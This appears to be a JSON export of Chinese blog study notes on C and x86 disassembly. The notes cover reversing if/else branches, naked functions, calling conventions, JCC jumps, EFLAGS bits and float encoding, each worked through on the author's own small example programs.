0040106A mov dword ptr [ebp-8],edx0040106D mov dword ptr [ebp-4],ecx00401070 mov eax,dword ptr [ebp-4]00401073 add eax,dword ptr [ebp-8]00401076 add eax,dword ptr [ebp+8]00401079 mov [g_x (00427958)],eax0040107E pop edi 0040107F pop esi 00401080 pop ebx 00401081 mov esp,ebp00401083 pop ebp 00401084 ret 4 观察步骤：1、不考虑ebp、esp2、只找给别人赋值的寄存器eax/ecx/edx/ebx/esi/edi3、找到以后追查其来源，如果，该寄存器中的值，不是在函数内存赋值的，那一定是传进来的参数.公式一：寄存器 + ret 4\\8\\0C = 参数个数公式二：寄存器 + [ebp+8]+[ebp+0x] = 参数个数这两个公式可以互相结合验证看是否算的对。如以上代码段，只可以找到edi,ecx,edx给别人赋值，但是其中edi ecx都是函数内存赋的值，所以只剩下edx，在加上最后的ret 4（这个肯定是push进来了一个参数）就等于2，也就是2个参数。与公式二检验发现没问题，[ebp+0x]类似的只出现一个. 分支语句正向代码练习 练习1:定义4个int类型的全局变量，分别是g_x,g_y,g_z,g_r,使用if..else..分支语句，将最大的值存储到g_r中。 1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot;int g_x = 5;int g_y = 3;int g_z = 7;int g_r = 0;void getMax()&#123; if(g_x&gt;g_y) &#123; if (g_x&gt;g_z) &#123; g_r=g_x; &#125; else&#123; g_r=g_z; &#125; &#125; else if (g_y &gt; g_z) &#123; g_r=g_y; &#125; else g_r=g_z; printf(&quot;%d\\n&quot;,g_r);&#125;int main(int argc, char* argv[])&#123; getMax(); return 0;&#125; 练习2:找出数组里面最大的值，并存储到全局变量中 -w238 12345678910111213141516171819202122232425262728293031323334353637383940#include &quot;stdafx.h&quot;int a[4] = &#123;2,5,7,9&#125;;int g_r = 0;void getMax()&#123; if(a[0]&gt;a[1]) &#123; if (a[0]&gt;a[2]) &#123; if (a[0]&gt;a[3]) &#123; g_r=a[0]; &#125; else g_r=a[3]; &#125; else if(a[2]&gt;a[3])&#123; g_r=a[2]; &#125; else g_r=a[3]; &#125; else if (a[1] &gt; a[2]) &#123; if (a[1]&gt;a[3]) &#123; g_r=a[1]; &#125; else g_r=a[3]; &#125; else if (a[2] &gt; a[3]) &#123; g_r=a[2]; &#125; else g_r=a[3]; printf(&quot;%d\\n&quot;,g_r);&#125;int main(int argc, char* argv[])&#123; getMax(); return 0;&#125; 感悟1：分支语句中if else,及其相互套用，要知道当某个条件成功后，执行其中的代码，然后以后于它的代码都不会再进行判断和执行。2：一个if只对应于一个else，else只能在if后出现与其搭配使用。 逆向分析IF语句逆向分析特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的近end中没有jmp指令。根据以上特征，把jxx指令取反后，即可还原if语句的代码。（我们要知道jcc代码跳转语句，其判断条件正好跟c的if判断条件是正好反过来的。） -w262 汇编代码： -w331 对于这段代码我们采取一定的分析顺序来分析： 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 无 分析全局变量 mov dword ptr 004225c4,ecx 功能分析:将参数X存到到EAX中，然后比较EAX,与参数Y的大小.如果X&lt;=Y 那么跳转到00401059的位置,否则，将X的值存储到全局变量中 返回值分析 无 练习： -w367 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：a 分析全局变量 mov eax,[004225c4]: m 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 逆为c函数： 1234567891011int m=1;void Funcation(int x, int y)&#123; int a; a=m; if(x&lt;=y) &#123; y=y+a; m=y; &#125;&#125; IF…ELSE…语句逆向分析if..ees语句比if语句多出了-一个“else” ，当if表达式结果为真时跳过else分支语句块，当表达式结果为假时跳转到else 分支语句块中。 -w226 特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else中有的上方有jmp指令。else 代码的结尾没有jmp指令，else 的代码也会执行if _else. _end 的代码。根据以上特征，把jxx指令取反后，即可还原if…ese语句的代码总结：跳转执行一部分代码，不跳转执行另外一部分代码汇编代码： -w369 同样安装一定的顺序： 1：分析参数：[ebp+8] : X [ebp+0Ch] :Y2：分析局部变量 [ebp-4] = eax = [004225c4]3：分析全局变量 [004225c4] G4：功能分析:比较X与Y的大小，如果X&lt;=Y那么执行 -w427 如果X&gt;Y 那么执行 -w435 5：返回值分析 无练习： -w382 分析参数：[ebp+8] : X [ebp+0Ch] :Y 分析局部变量 [ebp-4]：eax:[004225c4]:a [ebp-8]:b:2 分析全局变量 mov eax,[004225c4] 功能分析:(省略，直接以c语言代码表示) 返回值分析 无 还原成c函数： 123456789101112131415int m=1;void Funcation(int x,int y)&#123; int a,b; a=m; b=2; if (x&gt;=y) &#123; b=b+1; if (x&lt;y) &#123; m=b; &#125;else m=a+b; &#125;&#125; IF…ELSE IF…ELSE逆向分析 -w307 特征识别:首先会有一个jxx指令用于向下跳转，且跳转的目的else if中有jmp指令。else if的跳转目的else中有jmp指令，且else码的结尾没有jmp指令，所有jmp的目标地址一致。根据以上特征，把jxx指令取反，即可还原if…else if….else语句的代码。如果某个分支没有条件判断，则为else部分。汇编代码： -w334 函数内部功能分析： 1、分析参数：`[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z` 2、分析局部变量 `[ebp-4] = A = 0 [ebp-8] = B = 1 [ebp-0Ch] = C = 2` 3、分析全局变量 无 4、功能分析 1234567891011121314151617if(x&gt;y) &#123; A = B+1; &#125; else if(x&gt;z) &#123; A = C+1; &#125; else if(x&gt;z) &#123; A = B+C &#125; else &#123; A = B+C+1; &#125; return A; 练习： -w305 1、分析参数：[ebp+8] X [ebp+0Ch] Y [ebp+10h] Z 2、分析局部变量 [ebp-4] = A [ebp-8] = B [ebp-0Ch] = C 3、分析全局变量 无 4.返回值分析 a+1 还原成C函数： 1234567891011121314151617181920int Funcation(int x,int y,int z)&#123; int a=0; int b=1; int c=2; if (x&lt;=y) &#123; a=b-1; &#125; else if (y&gt;=z) &#123; a=c+1; &#125; else if (x&gt;z) &#123; a=b+c; &#125; else a=b+c-1; return a+1;&#125; 感悟每个分支类型都有自己的特征点，记清楚这个后，分析起来会容易很多。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（三）","slug":"C语言学习与反汇编（三）","date":"2019-10-20T15:45:40.000Z","updated":"2019-10-23T14:48:14.000Z","comments":true,"path":"2019/10/20/C语言学习与反汇编（三）/","link":"","permalink":"http://chumen77.xyz/2019/10/20/C语言学习与反汇编（三）/","excerpt":"","text":"C语言与反汇编学习（三）前言本次主要学习一下C语言的数据类型与数据存储。 数据类型 -w709 学习数据类型的三个要素1、存储数据的宽度2、存储数据的格式3、作用范围(作用域)这些都是谈起一个数据类型的基本要素。 整数类型：char short int long char 8BIT 1字节 short 16BIT 2字节 int 32BIT 4字节 long 32BIT 4字节 123char i = 0xFF;short x =0xFF;long y =0xFF; 我们来看下在汇编其是什么样的： -w505 注意byte word dword的区别。然后我们测试一下以下代码： 123char i = 0x12345678;short x = 0x12345678;long y = 0x12345678; -w639 然后看到还是byte word dword，并且也没有报错，但是我们运行以后可以看到 -w1106 这就说明你写了32位的数给char i这个8位的容器，这是允许的，但是只能装下8位，就从低位开始把78放入。 整数类型分为有符号(signed)和无符号(unsigned)两种： 12char i = 0xFF;unsigned char i = 0xFF; 要知道其在内存里存着显示的都是FF -w178 但是输出打印出来一个是255 一个是-1，这就是说明在内存中存储的方式完全一样，但会根据你的定义来确实其是有符号还是无符号。其默认是有符号的，当你想用无符号的时候需要你来定义。并且这个只有在类型转换和大小比较中特别注意。因为你直接定义个无符号数，其在内存放的是和原来有符号数一样的，只是你在比较时编译器在编译的时候，会把其会把汇编代码跳转那里改成特定对应的JCC代码（只要针对无符号，因为默认是有符号的）。例子：无符号数比较，jcc是JBE，原来没有指定是无符号时，其是JLE（有符号） -w533 总结：1：在内存中存储的方式完全一样 。 2：在类型转换和大小比较中特别注意（运算）。 浮点类型：float doublefloat和double在存储方式上都是遵从IEEE的规范的float的存储方式如下图所示： -w619 double的存储方式如下图所示： -w729 将一个float型转化为内存存储格式的步骤为: 先将这个实数的绝对值化为二进制格式 将这个二进制格式实数的小数点左移或右移n位，直到小数点移动到第一个有 效数字的右边。 从小数点右边第一一位开始数出二十三位数字放入第22到第0位。 如果实数是正的，则在第31位放入“0”，否则放入“1”。 如果n是左移得到的，说明指数是正的，第30位放入“1”。如果n是右移得到的或n=0，则第30位放入“0”。 如果n是左移得到的，则将n减去1后化为二进制，并在左边加“0”补足七位，放入第29到第23位。 如果n是右移得到的或n=0，则将n化为二进制后在左边加“0’补足七位，再各位求反，再放入第29到第23位。 这是官方解释。有点麻烦。先练习一个：8.25转成浮点存储 -w271 -w229 所以8.25用二进制表示可表示为1000.01，科学计数法表示一下：1.00001X2^3小数点向左移动3位 指数为3，然后按照上面先放第一个空格0（因为是正数），接着放最后一个大格子00001（科学计数法表示后从小数点后），然后中间格子第一位1（因为是左移小数点），指数3-1=2变成二进制10从右边开始放入。这就是IEEE规范。(可以感受到最麻烦就是中间这段的确定值) -w409 按四位分割0100 0001 0000 0100 0000 0000 0000 0000=41040000，然后就这样的形式存入计算机内存。 我下面用简单的且是正确的办法来转换：将float类型的12.5 转换成16进制：先整理正数部分，12=C=1100小数部分 0.5 * 2=1.0所以二进制就是1100.1，科学计数法 1.1001x2^3这次对中间格子是直接用127+x的结果 变成二进制填充这个格子，x的值就是指数，其中左移是正右移为负 -w382 double类型前面讲解了单精度浮点类型的IEEE编码。double类型和float类型大同小异，只是double类型表示的范围更大，占用空间更多，是float类型所占用空间的两倍。当然，精准度也会更高。 double类型占8字节的内存空间，同样，最高位也用于表示符号，指数位占11位，剩余42位用于表示位数。在float中，指数位范围用8位表示，加127后用于判断指数符号。在double中，由于扩大了精度，因此指数范围使用11位正数表示，加1023后可用于指数符号判断。 double类型的IEEE编码转换过程与float 类型一样，可根据float类型的转换流程来转换double类型。 -w756 英文字符存储char x = ‘A’;对于一个英文字符，编译器会自动查ASCII表获取其定义的7位二进制数，然后转换存储其16进制放入内存中。例： -w446 -w420 补充： 标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。 ASCII 码使用指定的 7 位或 8 位二进制数组合来表示 128 或 256 种可能的字符。 扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。 为什么不是八位二进制呢？因为其第一位都是0，没必要记录，在起初7位已经满足需求。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（二）","slug":"C语言与反汇编学习（二）","date":"2019-10-19T15:49:13.000Z","updated":"2019-10-20T15:06:42.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（二）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（二）/","excerpt":"","text":"C语言与反汇编学习（二）前言本次主要学习一下c是如何变成汇编的，查找程序入口，调用约定，和主要练习使用__declspec(naked)裸函数实现部分简单的功能和完整的逆一个简单EXE成c语言。 裸函数什么是裸函数？12void __declspec(naked) Function() &#123;.....&#125; 在代码中申明函数后，编译时，除了入口参数压栈外，然后就是call这个函数，编译器不会为函数体生成任何代码。 运行裸函数为什么会出错以上的裸函数运行后，因为编译器除了入口参数压栈外，然后就是call这个函数，不会给其生成任何的汇编代码，所以明显运行后其无法回到原来的主函数，然后堆栈是不平衡的。所以： 1234void __declspec(naked) Function() &#123; __asm ret&#125; 加一个ret就好了，不会再报错了。 裸函数框架简单集合无参数无返回值的函数框架1234567891011121314151617181920212223void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 有参数有返回值的函数框架123456789101112131415161718192021222324252627void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 带局部变量的函数框架1234567891011121314151617181920212223242526272829void __declspec(naked) Function() &#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 push ebx push esi push edi lea edi,dword ptr ds:[ebp-0x40] mov eax,0xCCCCCCCC mov ecx,0x10 rep stosd //主要功能 mov dword ptr ds:[ebp-4],2 mov dword ptr ds:[ebp-8],3 mov eax,dword ptr ds:[ebp+8] add eax,dword ptr ds:[ebp+0xC] //注意汇编中局部变量的存放办法 pop edi pop edi pop esi pop ebx mov esp,ebp mov esp,ebp ret &#125;&#125; 在练习中发现对局部变量在汇编中如何存放，如何体现有些生疏，特此记录一下。 针对裸函数的练习目标是要实现以下功能： 1234567int plus(int x,int y,int z)&#123; int a = 2; int b = 3; int c = 4; return x+y+z+a+b+c;&#125; 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// Day2.cpp : Defines the entry point for the console application.//#include &quot;stdafx.h&quot;int __declspec(naked) plus(int x,int y,int z)&#123; __asm &#123; push ebp mov ebp,esp sub esp,0x40 //开栈 push ebx push esi push edi //保护现场 lea edi,dword ptr ds:[ebp-0x40] mov ecx,0x10 mov eax,0xCCCCCCCC rep stosd //为缓冲区填充数据 //真正要执行的功能 //局部变量：EBP—4开始 参数：ebp+8开始 //ebp+4是eip 原来call下条语句 mov eax,0x2 mov dword ptr ds:[ebp-0x4],eax mov eax,0x3 mov dword ptr ds:[ebp-0x8],eax mov eax,0x4 mov dword ptr ds:[ebp-0x0C],eax //放入局部变量 mov eax,dword ptr ds:[ebp+0x8] add eax,dword ptr ds:[ebp+0x0C] add eax,dword ptr ds:[ebp+0x10] add eax,dword ptr ds:[ebp-0x4] add eax,dword ptr ds:[ebp-0x8] add eax,dword ptr ds:[ebp-0x0C] mov dword ptr ds:[ebp-0x4],eax //把计算结果放入栈中，下面主函数打印a时要用到 pop edi; pop esi; pop ebx; mov esp,ebp pop ebp ret &#125;&#125;int main(int argc, char* argv[])&#123; int a; a=plus(6,7,8); printf(&quot;%d\\n&quot;,a); return 0;&#125; 练习这个可以更加熟悉堆栈结构，参数、局部变量的位置。 程序真正的入口main 或WinMain 是“语法规定的用户入口”，而不是“应用程序入口”。应用程序入口通常是启动函数。 在OD中默认设置就是到winmain入口就暂停程序，其并不是主函数入口。其实每一种编译器都有自己一套的编译标准，在主函数启动前要做一些必要的准备工作，下面我分析的是vc6.0的。 main 函数的识别与寻找只是vc++6.0main 函数被调用前要先调用的函数如下： GetVersion() _heap_init() GetCommandLineA() _crtGetEnvironmentStringsA() _setargv() _setenvp() _cinit() -w414 这些函数调用结束后就会调用main 函数，根据main 函数调用的特征，将3个参数压入栈内作为函数的参数。所以在winmain停下后，可以一直单步调试，遇到call的时候，注意前方是不是有3个参数被压入栈了，是的话这个可以基本判断它call的就是main函数直接步过进去即可，但是这个也不是一定的，结合智能od的注释，注释有win内核函数调用就不要进入函数就可以了。 函数调用约定常见的几种约定： -w355 cdecl使用VC++ (关闭优化选项)编译代码生成cdecl.exe文件后，使用OllyDbg调试:函数的参数1、2以逆序方式压人栈，调用Plus(函数( 401014)后，使用ADD ESP,8命令整理栈。调用者main()函数直接清理其压入栈的函数参数，这样的方式即是cdecl。 -w267 stdcallstdcall常用于win32 api，在往后的VB中很常见。这个是自身函数内部进行栈清理。若想使用stdcall方式编译源码，只要使用_ stdcall关键字即可。 -w295 栈的清理工作由add(函数中最后( 40100F)的RETN 8命令来执行。RETN 8命令的含义为RETN+POP 8字节，即返回后使ESP增加到指定大小。 像这样在被调用者add)函数内部清理栈的方式即为stdcall方式。stdcall方式的好处在于， 被调用者函数内部存在着栈清理代码，与每次调用函数时都要用ADD ESP,XXX命令的cdecI方式相比，代码尺寸要小。 虽然Win 32 API是使用C语言编写的库，但它使用的是stdcall方式，而不是C语言默认的cdecl方式。这是为了获得更好的兼容性，使C语言之外的其他语言( Delphi(Pascal)、Visual Basic等)也能直接调用API。 fastcallfastcal方式与stdcall方式基本类似，但该方式通常会使用寄存器(而非栈内存)去传递那些需要传递给函数的部分参数(前2个)。若某函数有4个参数，则前2个参数分别使用ECX、EDX寄存器传递。 顾名思义，fastcall方式的优势在于可以实现对函数的快速调用(从CPU的立场看，访问寄存器的速度要远比内存快得多)。单从函数调用本身来看，fastcall方式非常快，但是有时需要额外的系统开销来管理ECX、EDX寄存器。倘若调用函数前ECX与EDX中存有重要数据，那么使用它们前必须先备份。此外,如果函数本身很复杂，需要把ECX、EDX寄存器用作其他用途时，也需要将它们中的参数值存储到另外某个地方。有舍也有得。 -w292 就跟这种情况，一定要注意其是直接用寄存器来传参和计算的，不涉及栈，不过这个不常用。 -w330 这个就是常用的情况，传参的时候会把部分的参数用寄存器来传。 第一次完整逆一个exe（CallingConvention.exe）汇编分析 -w855 简单一看，这个就是停在winmain入口了，注意寻找前面所说的那个找call之前有3个参数压栈最为函数参数的语句，一直单步走： -w679 疑似出现符合的情况，这时候按F7进去查看内部： -w535 简单一看，就是我们要找的main函数。接下来为了加强分析可观性，我把汇编代码都放进了WPS中进行分析： -w1307 -w1311 -w1254 （箭头指的不是特别好……） 逆成c代码123456789101112131415161718192021222324#include &quot;stdafx.h&quot;int __stdcall plus2(int a,int b,int c)&#123; return a+b+c;&#125;int __cdecl plus3(int a,int b)&#123; return a+b;&#125;int __fastcall plus(int a,int b,int c,int d,int e)&#123; int z,s; z=plus2(a,b,c); s=plus3(b,a); return plus3(z,s);&#125;int main(int argc, char* argv[])&#123; int x; x=plus(1,3,4,6,7); printf(&quot;%d\\n&quot;,x); return 0;&#125; 这个练习过程其实是十分艰难的，我分析了有一个小时左右，主要是 开始对局部变量有些生疏，函数内部定义一个变量后汇编中会如何显示、 fastcall的认识不是很好 传入的6 7做了什么也不是很清楚最后结合ida生成的伪代码才完成，不过经过这个练习都学到了很多，使用ida也感受到了ida的强大，学到了在其中如何看一些简单的函数以及其与真正汇编代码的区别。","categories":[],"tags":[]},{"title":"C语言与反汇编学习（一）","slug":"C语言与反汇编学习（一）","date":"2019-10-19T02:26:17.000Z","updated":"2019-10-19T03:45:18.000Z","comments":true,"path":"2019/10/19/C语言与反汇编学习（一）/","link":"","permalink":"http://chumen77.xyz/2019/10/19/C语言与反汇编学习（一）/","excerpt":"","text":"C语言与反汇编学习（一）前言：本课主要学习VC开发环境的简单使用，和几个函数反汇编分析。 简单下熟悉VC6开发环境这里我直接用了编程达人的vc虚拟机，官方的vc6.0不是很好用，每次只支持调试一次，人家的可以突破这个限制。 创建项目 -w911 执行过程代码编写–&gt;生成EXE(F7)–&gt;运行(F5)–&gt;结束运行(Shift+F5) 一些简单操作设置断点设置断点是光标放到哪行代码后按下F9即可，这也是后面很多操作的最重要的起初操作。 -w338 调出寄存器，栈，内存窗口调出寄存器，栈，内存窗口 -w586 看图，在空白处右击点击一下你需要的窗口就好了。 -w526 进入反汇编窗口在程序运行时，且有适当断点的时候，看图 -w517 右击程序框内的空白处，然后点击GO to Disassembly 就好了。在这里面最重要的操作就是：F10 F11分别是步过和步入。这个跟od里不一样。 C语言的调用1、无参数，无返回值的函数调用2、有参数，无返回值的函数调用3、无参数，有返回值的函数调用4、有参数，有返回值的函数调用 函数的反汇编分析-空函数先上c：123456789#include &quot;stdafx.h&quot;void Function()&#123;&#125;int main(int argc, char* argv[])&#123; Function() return 0;&#125; 反汇编分析： -w438 函数的反汇编分析-简单功能两个数相加：c代码：12345678910#include &quot;stdafx.h&quot;void Plus(int x,int y)&#123; return x+y;&#125;int main(int argc, char* argv[])&#123; Plus(2,1); return 0;&#125; 反汇编分析： -w709 三个数相加：c代码：12345678910#include &quot;stdafx.h&quot;void Plus(int x,int y，int z)&#123; return x+y;&#125;int main(int argc, char* argv[])&#123; Plus(2,1,3); return 0;&#125; 反汇编分析： -w974 （和上面那个基本一样，只是为了练习，不详细写了） 函数的反汇编分析-嵌套调用要求：编写一个函数，能够实现对任意5个整数实现加法(使用Plus1和Plus2). c代码12345678910111213141516171819#include &quot;stdafx.h&quot;int Plus1(int x,int y)&#123; return x+y;&#125;int Plus2(int x,int y,int z)&#123; return x+y+z;&#125;int Plus3(int a,int b,int c,int d,int e)&#123; int i,j,m; i=Plus1(a,b); j=Plus2(c,d,e); m=Plus1(i,j); return m;&#125;int main(int argc, char* argv[]) &#123; Plus3(2,1,3,1,5); return 0; &#125; 反汇编分析： -w1534 （中间调用一个Plus1 和 Plus2，就不必进入分析了，基本跟前面简单分析那两个一样，这个练习是顺成下来的。） 总结：学完汇编了，就接着C与汇编结合分析，步步把常见的结合分析完。这次学习与练习，可以一整段一整段的读汇编代码了，（这个前面其实还有画过堆栈图，当时是一句句分析学习的，为了熟悉堆栈和汇编语句，找时间补下笔记）也熟悉了函数是如何嵌套调用的。","categories":[],"tags":[]},{"title":"JCC学习","slug":"JCC","date":"2019-10-07T15:09:50.000Z","updated":"2019-10-19T15:48:32.000Z","comments":true,"path":"2019/10/07/JCC/","link":"","permalink":"http://chumen77.xyz/2019/10/07/JCC/","excerpt":"","text":"JCC学习JCC指令集合详细__1、JE, JZ 结果为零则跳转(相等时跳转) ZF=1 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 3、JS 结果为负则跳转 SF=1 4、JNS 结果为非负则跳转 SF=0 5、JP, JPE 结果中1的个数为偶数则跳转 PF=1 6、JNP, JPO 结果中1的个数为偶数则跳转 PF=0 7、JO 结果溢出了则跳转 OF=1 8、JNO 结果没有溢出则跳转 OF=0 9、JB, JNAE 小于则跳转 (无符号数) CF=1 10、JNB, JAE 大于等于则跳转 (无符号数) CF=0 11、JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1 12、JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=0 13、JL, JNGE 小于则跳转 (有符号数) SF≠ OF 14、JNL, JGE 大于等于则跳转 (有符号数) SF=OF 15、JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF 16、JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF 表格总结 -w1067 直接摘抄的做的很详细，正好有助记，但是需要和上面详细指令搭配使用，要注意那些有符号的JCC跳转指令，因为在这个表里没有体现。也不用太着急背，熟悉一下就可以了，有部分是可以直接记住的，在往后遇到模糊的直接查下就可以了。 注意：JCC指令决定它跳不跳转跟别的没关系，只跟EFLAG标志寄存器有关系，根据符号位来进行跳转的 练习使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转.前提：能用CMP和TEST实现的优先考虑. 1、JE, JZ 结果为零则跳转(相等时跳转) ZF=11234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 2、JNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0123MOV AL,1TEST AL,ALJNZ 0X00401006 ####3、 JS 结果为负则跳转 SF=1 123MOV AL,1MOV CL,2CMP AL,CL 4、 JNS 结果为非负则跳转 SF=012XOR EAX,EAXJNS 0X0040102F 5、 JP, JPE 结果中1的个数为偶数则跳转 PF=11234MOV AL,2MOV CL,2CMP AL,CLJPE 0X00401008 6、JNP, JPO 结果中1的个数为奇数则跳转 PF=01234MOV AL,2MOV CL,1CMP AL,CLJPE 0X00401008 7、 JO 结果溢出了则跳转 OF=1123MOV AL,80SUB AL,10JO 0X00401008 8、 JNO 结果没有溢出则跳转 OF=0123MOV AX,0FFFFADD AX,80JNO 0X00401010 9、 JB, JNAE 小于则跳转 (无符号数) CF=11234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 10、 JNB, JAE 大于等于则跳转 (无符号数) CF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 11、 JBE, JNA 小于等于则跳转 (无符号数) CF=1 or ZF=1一种直接跟练习9一样直接构造让CF=1或者让跟练习1让ZF=0就可以了。 1234MOV AL,1MOV CL,1CMP AL,CLJE 0X0040102B 或者 1234MOV AX,80MOV CX,90CMP AX,CXJB 0X0040103E 12、 JNBE, JA 大于则跳转(无符号数) CF=0 and ZF=01234MOV AX,80MOV CX,90CMP CX,AXJB 0X00401044 解析： 这个与练习10的区别就是不可以让两个数相等。 13、 JL, JNGE 小于则跳转 (有符号数) SF≠ OF12345MOV AL,0XFFMOV CL,0X01CMP AL,CLJB 0X00401063JL 0X00401063 解析：终于到了让我十分迷惑的有无符号JCC的跳转指令，这里做了对比JB JL,看标志位肯定能解决一切（这是对计算机来说），我们没看标志位提前做判断的诀窍：就是当你用有符号数JCC指令（JG,JL,JLE,JGE，JNG，JNL,JNGE，JNLE）的时候，一定要把两个操作数直接人工看做有符号来看！ 比如这个练习用到了JL,FF就是-1了，那么-1&lt;1这个肯定的，所以JL跳转。但是对于JB，FF就是FF肯定大于1，所以没有跳转。 14、 JNL, JGE 大于等于则跳转 (有符号数) SF=OF1234MOV AL,1MOV CL,0CCCMP AL,CLJGE 0X0040108B 15、 JLE, JNG 小于等于则跳转 (有符号数) ZF=1 or SF≠ OF1234MOV AL,1MOV CL,0CCCMP CL,ALJGE 0X0040108B 这个就是对立15练习，想利用ZF等于1这个跳转，在cmp中没什么好整的，这两个操作数只能是相同的数，没什么看不看做有无符号的说法。 16、 JNLE, JG 大于则跳转(有符号数) ZF=0 and SF=OF1234MOV AX,1MOV CX,FFCMP AX,CXJG 0x004010A6 1234MOV AL,1MOV CL,0FFCMP AL,CLJG 0x004010A6 解析： 判断一下，第1段代码对还是第2段代码对？ 在原来的观点，对有符号JCC要把两个操作数看做转化后的有符号数对待，且一定要注意下数据宽度。在这个例子中，第一段代码是无法实现JG跳转的，因为其数据宽度的问题，影响到SF,所以其没办法SF=OF就没法跳转。","categories":[],"tags":[]},{"title":"标志寄存器","slug":"标志寄存器","date":"2019-10-06T14:01:14.000Z","updated":"2019-10-17T15:47:57.000Z","comments":true,"path":"2019/10/06/标志寄存器/","link":"","permalink":"http://chumen77.xyz/2019/10/06/标志寄存器/","excerpt":"","text":"标志寄存器部分标志寄存器详细介绍 需要先熟练记住这几个寄存器的位置和名称：CF PF AF ZF SF OF CF进位标志CF(Carry Flag):如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 解析：在看运算结果的时候，先提前确定好参与运算的数是有无符号数和它们的数据宽度。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。 PF奇偶标志PF(Parity Flag)：PF标志位，根据结果中最低有效字节(最低8位)中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。 AF辅助进位标志AF(Auxiliary Carry Flag)：如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。—-（维基百科） 辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。—（百度百科） 解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是在D0-D7中，D3向D4位进位或者借位，才会置1。（这个当初老师讲错、百度高赞也是错的，要注意一下）。 ZF零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。解析：引一下常用的xor r8/16/32,r8/16/32对寄存器清零操作。 SF符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把它换成2进制确定最高位是0还是1.例子： 123MOV AL,20MOV CX,8000ADD AX,CX -w117 这个就是在字上操作，然后相加结果是8020,最高位就是1000，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。 OF溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。 CF与SF区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出. -w315 结合这个图在应为对PF的判断，非常好用。判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。 练习写汇编指令只影响CF位的值12MOV AL,0FEADD AL,10 -w669 写汇编指令只影响PF位的值12MOV AL,1ADD AL,2 -w630 写汇编指令只影响AF位的值12MOV EAX,0FADD EAX,1 -w588 写汇编指令只影响SF位的值12MOV CL,0F1ADD CL,1 -w716 写汇编指令只影响OF位的值12MOV AL,80SUB AL,10 这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，站在80的位置顺时针查10，负-正=正，来实现溢出完成只影响OF位。","categories":[],"tags":[]},{"title":"数据宽度与逻辑运算","slug":"数据宽度与逻辑运算","date":"2019-10-01T13:08:32.000Z","updated":"2019-10-17T15:47:55.000Z","comments":true,"path":"2019/10/01/数据宽度与逻辑运算/","link":"","permalink":"http://chumen77.xyz/2019/10/01/数据宽度与逻辑运算/","excerpt":"","text":"数据宽度与逻辑运算数据宽度数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 